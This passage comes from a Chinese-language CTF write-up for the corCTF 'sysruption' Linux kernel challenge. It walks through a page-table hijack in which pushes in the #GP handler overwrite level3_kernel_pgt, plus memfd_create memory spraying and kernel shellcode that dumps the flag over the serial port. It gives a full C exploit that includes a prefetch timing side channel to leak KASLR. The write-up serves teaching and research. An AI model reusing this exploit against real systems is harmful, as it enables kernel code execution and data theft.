- 47~39 - **PML4** (Page Map Level-4, Page Global Directory, **PGD**) - entry 為 **PML4E**，在 linux 中的 type 為 `p4dval_t`
- 38~30 - **PDP** (Page-Directory-Pointer, Page Upper Directory, **PUD**) - entry 在 linux 中的 type 為 `pudval_t`
- 29~21 - **PD** (Page-Directory, Page Middle Directory, **PMD**) - entry 在 linux 中的 type 為 `pmdval_t`
- 20~12 - **PT** (Page-Table) - entry 在 linux 中的 type 為 `pteval_t`
- cr3 為 PML4 的物理位址

```c
// https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/include/asm/pgtable_64_types.h#L14
typedef unsigned long	pteval_t;
typedef unsigned long	pmdval_t;
typedef unsigned long	pudval_t;
typedef unsigned long	p4dval_t;
typedef unsigned long	pgdval_t;
```

在初始化階段，kernel 會使用不同的變數來保存 page table 的資訊，不過我們要關注的只有下面兩個：

```c
// https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/include/asm/pgtable_64.h#L23
extern pud_t level3_kernel_pgt[512]; // pud
extern pmd_t level2_kernel_pgt[512]; // pmd
```

當切換到 kernel space 時 page table 的結構會向下方：

![image-20230803125342477](/Users/u1f383/Library/Application Support/typora-user-images/image-20230803125342477.png)

由此可知 `level3_kernel_pgt` 與 `level2_kernel_pgt` 決定了 kernel text 的 physical address，因此如果我們能夠控制這兩個變數的內容，就能間接控制同樣以落在 kernel text 的 #GP handler mapping 到哪塊程式碼。



### PGT Hijacking

發生 interrupt 時，硬體會自動 push ss, sp, rflags, cs, rip, 0 到 stack 當中，才去執行 interrupt handler。以 #GP handler 為例，執行過程中對 stack 的操作如下：

```
   <asm_exc_general_protection>       clac
   <asm_exc_general_protection+3>     cld
   <asm_exc_general_protection+4>     call   error_entry
```

```
   <error_entry>       push   rsi
   <error_entry+1>     mov    rsi, qword ptr [rsp + 8]
   <error_entry+6>     mov    qword ptr [rsp + 8], rdi
   <error_entry+11>    push   rdx
   ...
   <error_entry+32>    push   rsi
```

因為 general propurse register 的內容可以控制，這也就意味著我們有一個 arbitrary write 的 primitive 可以使用。

如果要控制 kernel text，最直接的方式是將 `level2_kernel_pgt` index=8 的 entry 改成可控的 physical address，這樣就能讓 kernel text mapping 我們的 shellcode。然而，因為硬體自動 push register 的機制與指令 `call error_entry` 所 push 的 return address，在我們能控制目標 page table entry 前，就會蓋寫到其他 entry (e.g. kernel data) 而導致 kernel panic，因此我們將目標換成是 `level3_kernel_pgt` index=510 的 entry，藉由竄改 PUD level 的 page table 來控制 RIP。

因為變數是一起宣告的，因此 `level2_kernel_pgt` 會緊接在 `level3_kernel_pgt` 記憶體位址的下方，所我們將 rsp 設為 `level2_kernel_pgt + 0x30`：

```c
#define LEVEL2_KERNEL_PGT_OFFSET 0x102f000UL
uc->uc_mcontext.gregs[REG_RSP] = kaddr + LEVEL2_KERNEL_PGT_OFFSET + 0x30;
```

在執行到 `error_entry()` 時 rsp 就會是 `level3_kernel_pgt` index=510 的 entry 的位址，並在指令 `push rsi` 執行完就能夠成功竄改到 entry：

執行前：

```
 ► 0xffffffff81a011c0 <error_entry>       push   rsi
   0xffffffff81a011c1 <error_entry+1>     mov    rsi, qword ptr [rsp + 8]
   0xffffffff81a011c6 <error_entry+6>     mov    qword ptr [rsp + 8], rdi
   0xffffffff81a011cb <error_entry+11>    push   rdx
   0xffffffff81a011cc <error_entry+12>    push   rcx
   0xffffffff81a011cd <error_entry+13>    push   rax
   0xffffffff81a011ce <error_entry+14>    push   r8
   ---------------------------------------------------------------------------
   00:0000│ rsp 0xffffffff8202eff8 (level3_kernel_pgt+4088)
```

執行後：

```
Invalid address 0xffffffff81a00b50
```

因為 page table 被寫壞，讓 kernel 找不到 interrupt handler，因此就不斷觸發 #PF。不過如果我們可以填入一個合法的 entry，就能夠讓 kernel 繼續執行，甚至控制 RIP。



### From PGT To RIP

為了構造一個合法的 PUD entry，我們必須有一個可控資料的 physical address，這部分能透過 `memfd_create()` spraying memory 來解決：

```c
int mfd = memfd_create("x", 0);
fallocate(mfd, 0, 0, 0x30000 * 0x1000);
for (int i = 0; i < 0x30000; i++)
{
    mmap((void *)0x1234000, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, mfd, i * 0x1000);
    memcpy((void *)0x1234000, page, 0x1000);
    munmap((void *)0x1234000, 0x1000);
}
```

透過 `memfd_create()` 以及 `fallocate()`，我們可以建立一個大小可控的 anonymous file，而 anonymous file 的特性就是檔案內容會被儲存在 memory 當中，也就是能夠對應到一個 physical address 。再來我們透過 `mmap()` 做 memory mapping，直接用 memory access 的方式存取，並將構造好的 page table entry 與 shellcode 寫到裡面。

這邊假設 **0x0101120000** 為可控 page 的 physical address，因此我們需要透過 `push rsi` 將 `level3_kernel_pgt` index=510 的 entry 寫成 `0x0101120067`：

```c
uc->uc_mcontext.gregs[REG_RSI] = 0x0101120067UL;
```

為了提升 spraying 的機率，我們將 PMD、PT 與 shellcode 建構在同一個 page 上，這樣只需要猜對一個 physical address：

![image-20230803153525151](/Users/u1f383/Library/Application Support/typora-user-images/image-20230803153525151.png)

我們要控制執行流程的目標為 #PG handler `asm_exc_page_fault()`，所以 shellcode 會構造在 page 內偏移 0xb50 的地方：

```c
page_fault = kaddr + 0xa00b50;
page[(page_fault >> (12 + 9)) & 0x1ff] = 0x0101120067UL; // PMD
page[(page_fault >> (12)) & 0x1ff] = 0x01011201e3UL; // PT
memcpy(&page[0xb50 / 8], shellcode, 0x100);
```

如果 **0x0101120000** 真的是我們控制的 fake page table，之後在執行時 `asm_exc_page_fault()` 時就會執行到位於 offset `0xb50` 的 shellcode。

不過雖然我們可以在 kernel space 執行任意的 shellcode，但基本上整個 kernel 已經沒有辦法正常運作，要如何在這種情況下取得 flag？



### Get Flag

因為執行環境使用 initramfs 作為檔案系統，因此所有 unpack 的檔案 (包含 flag) 都會存在於記憶體當中。因為這個特性，我們可以透過 shellcode 讀取 flag 所在的記憶體，並想辦法印出來。這邊會遇到兩個問題：

1. flag 位於在記憶體的哪個地方
2. 要怎麼把 flag 印出來



**第一個問題**是使用 QEMU monitor 提供的命令 `pmemsave`，將整個 physical memory dump 出來後，用 `strings` 的方式找到相對位置：

```bash
# In QEMU monitor
pmemsave 0x10000000 0xf0000000 output
strings -t x output | grep "corctf{"
```

在執行 shellcode 時，我們能先執行 `swapgs;`，將 gsbase 切換成 kernel space 的，再透過 gsbase 指向 physical address mapping 的特性，使用相對位置讀取把 flag 給讀出來。舉例來說如果偏移為 1000，下方即是從偏移 1000 處讀 8 bytes 後將資料讀到 rax 當中：

```assembly
mov rdi, 1000
mov rax, %gs:[rdi]
```



**第二個問題**因為 QEMU 在執行 kernel 時有加上參數 `console=ttyS0`，因此我們可以透過指令 `out` 將 register 的內容輸出到 serial port `0x3f8` 當中，QEMU 就會接收到 register 的內容並印到 stdout。



考慮到 flag 的偏移會因為檔案長度而有所不同 (CPIO format)，因此最後用來取得 flag 的 shellcode 會將偏移 `69500000` 到 `70000000` 之間的資料全部印出來，而我們只需要將 socket 接收到的資料導向至另一個檔案，在用 `strings` 的方式取得存在於這些資料當中的 flag 即可：

```c
void shellcode()
{
    asm(".intel_syntax noprefix;"
        "swapgs;"
        "mov rdi, 69500000;"
        "mov rdx, 0x3f8;"
        "b: mov rcx, 0x8;"
        "mov rax, %gs:[rdi];"
        "a:"
        "out dx, al;"
        "shr rax, 8;"
        "dec rcx;"
        "cmp rcx, 0x0;"
        "jne a;"
        "add rdi, 0x8;"
        "cmp rdi, 70000000;"
        "jne b;"
        "c: jmp c;"
        ".att_syntax;");
}
```



### Final Exploit

```c
define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/ucontext.h>
#include <err.h>
#include <sys/syscall.h> /* Definition of SYS_* constants */
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})

#define PAUSE           \
    {                   \
        printf(":");    \
        int x;          \
        read(0, &x, 1); \
    }

#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull
#define entry_SYSCALL_64_offset 0x400000ull
    
uint64_t sidechannel(uint64_t addr)
{
    uint64_t a, b, c, d;
    asm volatile(".intel_syntax noprefix;"
                 "mfence;"
                 "rdtscp;"
                 "mov %0, rax;"
                 "mov %1, rdx;"
                 "xor rax, rax;"
                 "lfence;"
                 "prefetchnta qword ptr [%4];"
                 "prefetcht2 qword ptr [%4];"
                 "xor rax, rax;"
                 "lfence;"
                 "rdtscp;"
                 "mov %2, rax;"
                 "mov %3, rdx;"
                 "mfence;"
                 ".att_syntax;"
                 : "=r"(a), "=r"(b), "=r"(c), "=r"(d)
                 : "r"(addr)
                 : "rax", "rbx", "rcx", "rdx");
    a = (b << 32) | a;
    c = (d << 32) | c;
    return c - a;
}

#define STEP 0x100000ull
#define SCAN_START KERNEL_LOWER_BOUND + entry_SYSCALL_64_offset
#define SCAN_END KERNEL_UPPER_BOUND + entry_SYSCALL_64_offset

#define DUMMY_ITERATIONS 5
#define ITERATIONS 100
#define ARR_SIZE (SCAN_END - SCAN_START) / STEP

uint64_t leak_syscall_entry(void)
{
    uint64_t data[ARR_SIZE] = {0};
    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx < ARR_SIZE; idx++)
        {
            uint64_t test = SCAN_START + idx * STEP;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (int i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = SCAN_START + i * STEP;
        }
    }

    return addr;
}

size_t page[0x1000 / 8];
size_t kaddr;
size_t page_fault;
void handler_trap(int signum, siginfo_t *info, void *ucontext)
{
    ucontext_t *uc;

    uc = ucontext;

    for (int i = 0; i < 0x10; i++)
        uc->uc_mcontext.gregs[i] = 0x0101120067UL;

    uc->uc_mcontext.gregs[REG_RIP] = 0x0000800000000000UL;
    uc->uc_mcontext.gregs[REG_RCX] = 0x0000800000000000UL;
    uc->uc_mcontext.gregs[REG_R11] = 0x00246;
    uc->uc_mcontext.gregs[REG_EFL] = 0x00246;
    uc->uc_mcontext.gregs[REG_RSP] = kaddr + 0x102f030;
    PAUSE;
}

void shellcode()
{
    asm(".intel_syntax noprefix;"
        "swapgs;"
        "mov rdi, 69500000;"
        "mov rdx, 0x3f8;"

        "b: mov rcx, 0x8;"
        "mov rax, %gs:[rdi];"
        "a:"
        "out dx, al;"
        "shr rax, 8;"
        "dec rcx;"
        "cmp rcx, 0x0;"
        "jne a;"
        "add rdi, 0x8;"
        "cmp rdi, 70000000;"
        "jne b;"
        "c: jmp c;"
        ".att_syntax;");
}

int main()
{
    setvbuf(stdout, 0, 2, 0);
    struct sigaction action = {};
    kaddr = leak_syscall_entry() - 0xc00000;
    printf("%p\n", (void *)kaddr);
    page_fault = kaddr + 0xa00b50;
    page[(page_fault >> (12 + 9)) & 0x1ff] = 0x0101120067UL;
    page[(page_fault >> (12)) & 0x1ff] = 0x01011201e3UL;
    memcpy(&page[0xb50 / 8], shellcode, 0x100);

    int mfd = memfd_create("x", 0);
    fallocate(mfd, 0, 0, 0x30000 * 0x1000);
    for (int i = 0; i < 0x30000; i++) {
        mmap((void *)0x1234000, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, mfd, i * 0x1000);
        memcpy((void *)0x1234000, page, 0x1000);
        munmap((void *)0x1234000, 0x1000);
    }

    sigemptyset(&action.sa_mask);
    action.sa_sigaction = handler_trap;
    action.sa_flags |= SA_SIGINFO;
    sigaction(SIGTRAP, &action, NULL);
    asm("int3");
    return 0;
}
```



### Other Writeups

- [First blood](https://zolutal.github.io/corctf-sysruption/)
  1. signal 控 register 的方式改成用 ptrace
  2. 用 bypass KASLR 的方式 leak PHYS mapping
  3. gsbase 能在 user space 被 instruction `wrgsbase` 設置，讓 `asm_exc_general_protection()` 能順利執行
  4. 把 rsp 設為目標的 address，並且透過控制其他 registers，在 exception handler `push` 時蓋寫任意值
  5. 修一些會讓 kernel 壞掉的部分
- [出題者](https://www.willsroot.io/2023/08/sysruption.html) - 大部分作法與第一篇文章相似
  1. 蓋寫 `tcp_prot` 來做 ROP